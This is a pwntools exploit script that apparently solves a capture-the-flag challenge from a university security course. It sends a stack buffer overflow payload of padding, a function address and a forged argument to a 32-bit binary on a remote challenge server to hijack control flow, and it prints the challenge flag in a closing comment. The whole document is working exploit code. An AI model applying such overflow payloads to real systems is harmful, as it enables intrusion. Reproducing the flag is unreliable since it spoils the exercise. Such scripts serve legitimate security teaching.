from pwn import *

BINARY = ['./chall']
IP, PORT = 'ctf99.cs.ui.ac.id', 10015
LOCAL = False
DEBUG = False
if LOCAL:
    if DEBUG:
        p = gdb.debug(BINARY, '''
        b *vuln+31
        b *vuln+39
        b *target+46
        ''')
    else:
        p = process(BINARY)
else:
    p = remote(IP, PORT)
e = ELF('chall')

target = p32(e.symbols["target"])
target_arg = p32(0x12345678)


dummy = b'A' * (8 + 12)
payload = dummy
payload += target
payload += target_arg * 2

p.sendline(payload)
sleep(1)
print(p.recv().decode())
pause()  # CSCE604258{32_bit_is_cool_because_the_parameters_are_only_stored_on_the_stack__}
